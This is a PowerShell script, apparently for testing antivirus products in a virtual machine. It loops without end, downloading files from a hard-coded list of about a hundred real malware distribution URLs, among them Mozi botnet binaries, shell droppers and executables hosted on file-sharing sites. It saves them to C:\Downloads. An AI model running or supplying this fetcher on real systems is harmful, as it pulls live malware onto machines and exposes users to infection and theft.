# DO NOT RUN THIS FILE ON YOUR HOST MACHINE, DO IT ON A VIRTUAL MACHINE (VM) IF YOU'RE GOING TO RUN THE CODE AT ALL. THIS SCRIPT PINGS KNOWN MALICIOUS
# DOMAINS, WHICH MAY STEAL INFORMATION. TO ENSURE SAFE USE OF THIS PROGRAM INSIDE A VIRTUAL MACHINE, PLEASE RUN THE PROGRAM AND DO NOT ADD EXCLUSIONS IN
# THE ANTIVIRUS YOU ARE TRYING TO TEST AS IT WILL DECREASE THE TEST'S USEFULNESS. THIS PROGRAM IS UNDER EXPERIMENTATION AND MAY NOT WORK AS INTENDED IF
# AT ALL. PLEASE KEEP THIS IN MIND WHEN EXECUTING THIS PROGRAM IN YOUR VIRTUAL MACHINE.

while ($true) {

$urls = @(
    "http://222.137.83.24:39926/bin.sh",
    "http://117.252.168.65:36030/i",
    "http://115.63.183.62:58957/bin.sh",
    "http://115.50.30.228:33238/bin.sh",
    "http://117.255.187.113:34482/bin.sh",
    "http://117.194.169.233:55807/bin.sh",
    "http://117.211.44.120:39163/i",
    "http://42.224.85.153:49075/i",
    "http://84.121.112.59:41300/.i",
    "http://83.209.205.203:47438/i",
    "http://219.157.64.26:51588/bin.sh",
    "http://124.131.107.45:41206/bin.sh",
    "http://119.189.229.170:46945/bin.sh",
    "http://42.225.49.4:59977/i",
    "http://112.248.117.174:42546/i",
    "http://46.32.172.198:10955/mozi.a",
    "http://42.224.85.153:49075/bin.sh",
    "http://182.126.85.152:55278/i",
    "http://182.116.119.63:40991/bin.sh",
    "http://117.252.168.65:36030/bin.sh",
    "http://115.49.200.84:48478/i",
    "http://113.194.129.107:35910/i",
    "http://117.219.125.10:56020/bin.sh",
    "http://175.107.13.12:55058/Mozi.m",
    "http://27.206.197.66:58445/Mozi.m",
    "http://115.48.150.37:55699/Mozi.m",
    "http://190.182.251.198:41251/Mozi.m",
    "http://116.68.97.168:37778/Mozi.m",
    "http://59.88.224.200:53089/Mozi.m",
    "http://112.239.98.168:42835/Mozi.m",
    "http://42.225.49.4:59977/bin.sh",
    "http://164.163.25.180:39963/Mozi.m",
    "http://222.142.255.34:55854/Mozi.m",
    "http://190.182.251.172:59569/Mozi.m",
    "http://102.33.143.130:58963/Mozi.m",
    "http://113.110.77.113:59652/Mozi.m",
    "http://59.89.234.92:36638/Mozi.m",
    "http://115.75.59.189:51209/Mozi.m",
    "http://27.215.214.244:37465/bin.sh",
    "http://222.138.79.96:37411/bin.sh",
    "http://222.137.83.24:39926/i",
    "http://42.229.223.251:42716/bin.sh",
    "http://213.200.146.138:59867/mozi.a",
    "http://112.248.28.75:51267/i",
    "http://115.48.50.151:48977/i",
    "http://221.14.106.144:38505/i",
    "http://113.194.129.107:35910/bin.sh",
    "http://59.182.145.83:52927/i",
    "http://222.137.83.24:39926/bin.sh",
    "http://42.224.28.168:43190/bin.sh",
    "http://182.121.152.8:40945/i",
    "http://182.118.146.233:49837/i",
    "http://117.215.240.146:50094/i",
    "http://61.53.157.235:60359/bin.sh",
    "https://wtools.io/paste-code/bOhE",
    "http://59.182.145.83:52927/bin.sh",
    "http://222.137.70.97:48786/bin.sh",
    "http://61.3.97.81:37897/bin.sh",
    "http://114.198.244.51:34722/bin.sh",
    "http://182.121.152.8:40945/bin.sh",
    "http://123.10.225.88:54308/bin.sh",
    "http://115.49.200.84:48478/bin.sh",
    "http://123.5.138.38:43002/i",
    "http://123.12.31.84:33354/i",
    "http://42.235.91.38:60605/i",
    "http://117.253.148.203:54183/bin.sh",
    "http://77.91.124.31/smo/du.exe",
    "http://77.91.68.16/smo/du.exe",
    "http://185.252.179.228/file/lega.exe",
    "http://77.91.124.5/gallery/photo270.exe",
    "http://185.252.179.228/lend/norway_cr.exe",
    "http://185.252.179.228/lend/rcoekta.exe",
    "https://transfer.sh/get/bYwIQDJxkQ/bnhost.exe",
    "https://www.dropbox.com/s/3h006ikv0xyk3ku/OlympOfReptiles.exe?dl=1",
    "https://dl.dropboxusercontent.com/s/3h006ikv0xyk3ku/OlympOfReptiles.exe?dl=1",
    "https://www.dropbox.com/s/n05qrwwy58nqegx/DestructionSetup.exe?dl=1",
    "https://dl.dropboxusercontent.com/s/n05qrwwy58nqegx/DestructionSetup.exe?dl=1",
    "https://github.com/EvolionBeta/evolion/raw/9a0d6f9ea3175be24ebaccb34f9f2041bc5acb6a/Evolion.rar",
    "https://dl.dropboxusercontent.com/s/0fqahirppzmy7jf/Brawlearth.exe?dl=1",
    "https://www.dropbox.com/s/0fqahirppzmy7jf/Brawlearth.exe?dl=1",
    "https://transfer.sh/get/dM0XO37E0H/crypted.exe",
    "https://transfer.sh/get/ydICpja59w/tester.exe",
    "http://87.121.221.212/haitianzx.exe",
    "http://95.214.27.98/lend/Aleksey289_crypted.exe",
    "http://77.91.68.144:8000/2.exe",
    "https://github.com/cracksoftorg/12423434/raw/main/234234.exe",
    "https://github.com/VoidTeamSec/Channel/raw/main/Output.exe",
    "https://github.com/cracksoftorg/12423434/raw/main/73727282.exe",
    "http://77.91.68.16/new/foto175.exe",
    "http://77.91.68.16/new/fotod45.exe",
    "http://45.66.230.164/g.exe",
    "http://77.91.124.31/gallery/photo270.exe",
    "http://77.91.68.157/new/foto175.exe",
    "http://77.91.68.157/new/fotod45.exe",
    "http://95.214.27.98/lend/rocketpro.exe",
    "http://95.214.27.98/lend/rok.exe",
    "http://95.214.27.98/lend/bu333ild.exe",
    "https://github.com/naati/demo-repo/releases/download/dsv/ytt.exe",
    "http://195.133.147.56:48900/fb.exe",
    "http://95.214.25.233:3002/",
    "http://95.214.27.98/lend/ProfileUpdate.exe"


    
)

$outputFolder = "C:\Downloads"

foreach ($url in $urls) {
    $fileName = [System.IO.Path]::GetFileName($url)
    $outputPath = Join-Path -Path $outputFolder -ChildPath $fileName

    Write-Host "Downloading file from $url..."
    
    try {
        Invoke-WebRequest -Uri $url -OutFile $outputPath
        Write-Host "File downloaded successfully: $outputPath"
    } catch {
        Write-Host "Failed to download file: $url"
    }
}

# Arth-End loop
}
